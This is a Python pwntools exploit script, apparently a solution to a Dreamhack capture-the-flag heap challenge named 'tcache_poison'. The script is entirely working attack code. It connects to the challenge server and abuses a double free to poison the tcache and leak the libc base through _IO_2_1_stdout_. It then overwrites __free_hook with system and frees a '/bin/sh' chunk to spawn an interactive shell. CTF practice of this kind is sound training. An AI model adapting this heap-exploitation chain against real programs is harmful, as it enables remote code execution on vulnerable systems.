from pwn import *

elf = ELF("./tcache_poison_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = elf

# p = process()
p = remote("host1.dreamhack.games",  22553)
# gdb.attach(p)

def malloc(size, content):
    p.sendlineafter(b'Edit\n', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendlineafter(b'Content: ', content)

def free():
    p.sendlineafter(b'Edit\n', b'2')

def read():
    p.sendlineafter(b'Edit\n', b'3')
    p.recvuntil(b'Content: ')
    return p.recvuntil(b'1. Allocate', drop=True)

def edit(data):
    p.sendlineafter(b'Edit\n', b'4')
    p.sendlineafter(b'chunk: ', data)

malloc(30, b'a')
free()
context.log_level = 'debug'
edit(b'a' * 16)
free()
edit(pack(0x601000))

malloc(30, b'')
malloc(30, b'a' * 15)
libcBase = unpack(read().split(b'\n')[1].ljust(8,b'\x00')) - libc.symbols['_IO_2_1_stdout_']
print(hex(libcBase))

malloc(30, b'')
free()
edit(b'a' * 16)
free()
edit(pack(libcBase + libc.symbols['__free_hook']))
malloc(30, b'')
malloc(30, pack(libcBase + libc.symbols['system']))

malloc(30, b'/bin/sh')
free()

p.interactive()